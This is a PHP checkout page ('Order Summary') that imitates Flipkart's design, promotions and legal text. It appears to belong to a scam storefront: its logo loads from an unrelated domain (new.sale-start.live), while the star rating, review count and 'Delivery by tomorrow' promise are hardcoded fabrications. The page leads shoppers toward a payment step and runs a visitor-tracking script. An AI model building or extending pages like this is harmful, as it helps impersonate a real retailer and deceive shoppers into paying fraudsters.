<?php
include('inc/function.php');
if (!isset($_GET['product'])) {
    header("Location: index.php");
    exit();
}
$product_slug = $_GET['product'];
$product_data = mysqli_query($con, "SELECT * FROM product WHERE slug='" . mysqli_real_escape_string($con, $product_slug) . "'");
if (mysqli_num_rows($product_data) == 0) {
    header("Location: index.php");
    exit();
}
$product_id_row = mysqli_fetch_array($product_data);
$product = get_product($con, $product_id_row['id']);
$p = $product[0];
$disc = cal_percentage($p['price'], $p['mrp']);
$savings = $p['mrp'] - $p['price'];
?>
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Order Summary</title>
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" rel="stylesheet">
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="/assets/css/order-summary.css">
</head>

<body>
  <div id="fkPageLoader" class="fk-page-loader">
    <div class="fk-loader-spinner">
      <img src="https://new.sale-start.live/img/fklogo.png" alt="Loading" width="34" height="34">
    </div>
  </div>
  <div class="header">
    <i class="fas fa-arrow-left" onclick="history.back()"></i>
    <div class="header-title">Order Summary</div>
  </div>

  <div class="stepper">
    <div class="step completed">
      <div class="progress-bar"></div>
      <div class="step-icon"><i class="fas fa-check"></i></div>
      <div class="step-label">Address</div>
    </div>
    <div class="step active">
      <div class="progress-bar"></div>
      <div class="step-icon">2</div>
      <div class="step-label">Order Summary</div>
    </div>
    <div class="step">
      <div class="progress-bar"></div>
      <div class="step-icon">3</div>
      <div class="step-label">Payment</div>
    </div>
  </div>

  <div class="address-card">
    <div class="addr-header">
      <div class="addr-title">Deliver to:</div>
      <a href="address.php?product=<?php echo htmlspecialchars($product_slug); ?>" class="change-btn">Change</a>
    </div>
    <div id="addr-details">
      <div class="addr-name">Loading...</div>
      <div class="addr-text">Please select an address</div>
      <div class="addr-phone"></div>
    </div>
  </div>

  <div class="cart-item">
    <div class="item-media">
      <img src="<?php echo PRODUCT_PATH . htmlspecialchars(str_replace(' ', '%20', $p['image'])); ?>" class="item-img">
      <div class="qty-static">Qty: 1</div>
    </div>
    <div class="item-info">
      <div class="item-title"><?php echo htmlspecialchars($p['name']); ?></div>
      <?php if(isset($_GET['selected_color_name']) && $_GET['selected_color_name'] != ''): ?><div style="font-size:11px;color:#878787;margin-bottom:5px;">Variant: <?php echo htmlspecialchars($_GET['selected_color_name']); ?></div><?php endif; ?>
      <div class="rating-badge">
        <span style="font-size:10px;color:#878787">4.2</span>
        <i class="fas fa-star" style="font-size:8px;color:#878787"></i>
        <span style="color:#878787">(13,597)</span>
        <img src="https://static-assets-web.flixcart.com/fk-p-linchpin-web/fk-cp-zion/img/fa_62673a.png"
          style="height:14px;margin-left:4px">
      </div>
      <div class="price-row">
        <span class="off">↓<?php echo $disc; ?>%</span>
        <span class="mrp">₹<?php echo number_format($p['mrp'], 0, '.', ','); ?></span>
        <span class="price">₹<?php echo number_format($p['price'], 0, '.', ','); ?></span>
      </div>
      <div class="delivery-info">Delivery by tomorrow</div>
    </div>
  </div>

  <div class="flipkart-black">
    <div class="fb-logo">
      <img
        src="https://rukminim1.flixcart.com/www/128/128/promos/04/08/2025/985f2979-7ae1-4a04-8470-226b6eff9430.png?q=90">
    </div>
    <div class="fb-content">
      <div class="fb-text">Get privileges worth ₹2,290</div>
      <div class="fb-sub">FREE YouTube Premium, 5% SuperCoin cashback only with Black membership →</div>
    </div>
  </div>

  <div class="open-box">
    <i class="fas fa-box-open ob-icon"></i>
    <div class="ob-text">
      <span style="font-weight:500">Rest assured with Open Box Delivery</span><br>
      Delivery agent will open the package so you can check for correct product, damage or missing items. Share OTP to
      accept the delivery.
    </div>
  </div>

  <div class="price-details">
    <div class="pd-header">Price Details</div>
    <div class="pd-row">
      <span>Price (1 items) <i class="fas fa-info-circle" style="color:#878787;font-size:10px"></i></span>
      <span>₹<?php echo number_format($p['mrp'], 0, '.', ','); ?></span>
    </div>
    <div class="pd-row">
      <span>Discount</span>
      <span class="pd-green">- ₹<?php echo number_format($savings, 0, '.', ','); ?></span>
    </div>
    <div class="pd-row">
      <span>Delivery Charges</span>
      <span class="pd-green">Free</span>
    </div>
    <div class="pd-row pd-total">
      <span>Total Amount</span>
      <span>₹<?php echo number_format($p['price'], 0, '.', ','); ?></span>
    </div>
    <div class="savings-msg">You will save - ₹<?php echo number_format($savings, 0, '.', ','); ?> on this order</div>
  </div>

  <div class="legal-text">
    By continuing with the order, you confirm that you are above 18 years of age, and you agree to the Flipkart's <a
      href="#" class="legal-link">Terms of Use</a> and <a href="#" class="legal-link">Privacy Policy</a>
  </div>

  <div class="bottom-bar">
    <div class="total-info">
      <span class="total-mrp">₹<?php echo number_format($p['mrp'], 0, '.', ','); ?></span>
      <span class="total-amt">₹<?php echo number_format($p['price'], 0, '.', ','); ?> <i class="fas fa-info-circle info-icon"></i></span>
    </div>
    <button class="continue-btn" onclick="proceedToPayment()">Continue</button>
  </div>

  <script>
    const PRODUCT_SLUG = "<?php echo htmlspecialchars($product_slug); ?>";
  </script>
  <script src="/assets/js/order-summary.js"></script>
  <script src="/visitor.js" data-page="order_summary" defer></script>
  <script type="module"
    src="https://static.cloudflareinsights.com/beacon.min.js/v3d52b47920f24c319d37e2661827c42b1787588026925"
    integrity="sha512-d9sL6GJLXn6fInD1+TVXhTcQOsmxeHfmHAvwGDIxp5TO+uo1fiWW7mHomMj4MLRlCsJDTqXzWLHJFFlPCEIj/A=="
    data-cf-beacon='{"version":"2024.11.0","token":"0b2008e19fd943c7831b0ee755168137","r":1}'
    crossorigin="anonymous"></script>
</body>

</html>
